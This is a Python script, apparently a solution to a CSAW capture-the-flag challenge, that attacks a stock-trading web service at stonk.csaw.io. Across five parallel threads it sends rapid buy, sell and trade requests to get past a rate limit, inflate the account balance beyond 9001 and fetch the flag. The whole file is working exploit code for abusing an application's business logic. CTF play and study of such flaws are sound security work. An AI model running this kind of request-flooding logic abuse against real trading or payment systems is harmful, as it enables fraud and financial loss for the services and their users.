import json
import threading
import time
import requests
import sys


ADDRESS = "http://stonk.csaw.io"
PORT = sys.argv[1]

# ADDRESS = "http://localhost"
# PORT=4657




def inp() -> str:
    print(">", end="")
    return input()

def sendGET(subpath) -> str:
    try:
        response = requests.get(ADDRESS + ":" + str(PORT) + subpath)
        response.raise_for_status()  # Raises an exception for bad status codes
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return None


def sendPOST(subpath, data) -> str:
    url = ADDRESS + ":" + str(PORT) + subpath
    payload = data

    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()  # Raises an exception for bad status codes
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return None

def buyStock(key, str):
    body = sendPOST("/buy", {"key":key, "stock": str})
    return body

def sellStock(key, str):
    body = sendPOST("/sell", {"key":key, "stock": str})
    return body

def tradeStock(key, str, str1):
    body = sendPOST("/trade", {"key":key, "stock": str, "stock1": str1})
    return body

def listCalls() -> str:
    body = sendGET("/listCalls")
    out = json.loads(body)
    return "\n".join((str(i["name"]) + " at " + str(i["price"]) for i in out.values()))

def flag(key) -> str:
    body = sendPOST("/flag", {"key":key})
    return body

def status(key) -> str:
    body = sendPOST("/login", {"key":key})
    return body


key="my_super_evil_user_{}"


def exploit(key):
    while True:
        stat=json.loads(status(key))
        while int(stat['balance'])<9001 :
            limit=0

            
            # 1 requests
            if stat.get('BROOKING',None)!=None and (int(stat['BROOKING'])*1522.53+int(stat['balance']))>9001:
                break
            stat=json.loads(status(key))
            print(key,stat)
            
            # 8 requests
            for k in range(4): 
                buyStock(key,"BURPSHARKHAT")
                sellStock(key,"BURPSHARKHAT")
                limit+=2
            print("Limit is:",limit)
            sellStock(key,"BURPSHARKHAT")
            buyStock(key,"BURPSHARKHAT")
            print("Now I have,BURPSHARKHAT")
            # Limit hit
            tradeStock(key,"BURPSHARKHAT","BROOKING")
            time.sleep(3)
            sellStock(key,"BROOKING")

        for i in range(10):
            sellStock(key,"BROOKING")
        print(flag(key))
            
for i in range(0,5):
    threading.Thread(target=exploit, args=(key.format(i),)).start()
    time.sleep(1)

